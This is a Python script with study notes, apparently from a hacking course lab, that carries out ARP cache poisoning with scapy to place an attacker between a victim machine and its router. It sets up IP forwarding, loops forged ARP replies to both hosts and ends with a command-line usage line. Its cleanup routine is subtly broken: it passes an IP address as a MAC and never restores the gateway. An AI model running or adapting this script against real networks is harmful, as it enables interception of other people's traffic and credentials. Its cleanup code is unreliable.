'''
MAN IN THE MIDDLE 
ARP Response Creation
Open windows and kali, on kali : echo 1 > /proc/sys/net/ipv4/ip_forward 
Basically setting the value to 1, can also manually go to the folder and open it in leafpad to change the value. It is for packet forwarding the process.
We need to do this everytime we start kali, required or else the windows(victim) will lose internet connection.
try arp -a in windows before and after running the program to check if windows router mac is same as our kali mac.
'''
import scapy.all as scapy
'''scapy.ls(scapy.ARP()) in kali, pdst we learnt before, op=1 by default which is for creating an arp request, to make it into a arp response, change op to 2.
again scapy.ls(scapy.ARP()) , hwsrc=kaliMAC, psrc=kaliIP, hwdst=targetMAC, pdst=targetIP (by default)
we'll need to change hwsrc and psrc accoringly, since once we'll need to make target think as we are the router and then we'll need to make router think as we are the target.
'''

import time
import optparse

def get_mac_address(ip):
	arp_request_packet=scapy.ARP(pdst=ip)
	broadcast_packet=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")					
	combined_packet = broadcast_packet/arp_request_packet	
	answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0]			#since we only need the first part, we dont need the unanswered list(which is the second part)
	#print(list(answered_list))
	#print(list(answered_list[0][1]))
	return (answered_list[0][1].hwsrc)							#No need to use for loop or regex or other tools, scapy has a built in function, to find the hwsrc

def arp_poisoning(target_ip, poisoned_ip):

	target_mac=get_mac_address(target_ip)

	arp_response=scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip)		#routerIP is poisonedIP here at this stage 
	#try arp -a in windows before and after running the program to check if windows router mac is same as our kali mac
	scapy.send(arp_response,verbose=False)	


def reset_operation(fooled_ip, gateway_ip):								#again setting back the original mac (removing our traces of hack)			

	fooled_mac=get_mac_address(fooled_ip)

	arp_response=scapy.ARP(op=2,pdst=fooled_ip,hwdst=fooled_mac,psrc=gateway_ip,hwsrc=gateway_ip)		#routerIP is poisonedIP here at this stage,added hwsrc also this time as  earlier it was kali IP by default
	scapy.send(arp_response,verbose=False,count=6)						# We'll probably have only 1 shot, after keyboard interruption, hence sending more packets to reset it for sure.

def get_user_input():
	parse_object=optparse.OptionParser()
	parse_object.add_option("-t","--target",dest="target_ip",help="enter target IP")
	parse_object.add_option("-g","--gateway",dest="gateway_ip",help="enter gateway/router IP")

	#(option,arguments)=parse_object.parse_args()  OR 
	options=parse_object.parse_args()[0]
	
	if not options.target_ip:
		print("enter target ip")
	if not options.gateway_ip:
		print("enter gateway ip")
	return options

z=0

user_ips=get_user_input()									#ovio a tuple will be returned to 'user_ips'
user_target_ip=user_ips.target_ip
user_gateway_ip=user_ips.gateway_ip

try:
	while True:
		arp_poisoning(user_target_ip,user_gateway_ip)
		arp_poisoning(user_gateway_ip,user_target_ip)
		# making the router think we are target and vice-versa, we need to loop it since it resets after ~ 1 minute.
		z+=2									#since sending 2 packets OVERALL at a time
		print("\rSending packets " + str(z), end="")			#\r will display it again and again but previous will get erased(maybe, check documentation for \r)
		time.sleep(3)								#sleep for 3 secs to avoid crashing

except KeyboardInterrupt:								#since we'll only treat (error) shown on keyboard interruption.								
	print("\nquitting and restarting")
	reset_operation(user_target_ip,user_gateway_ip)
	reset_operation(user_target_ip,user_gateway_ip)

#On kali : python3 <projectName.py> -t <targetIP> -g <routerIP>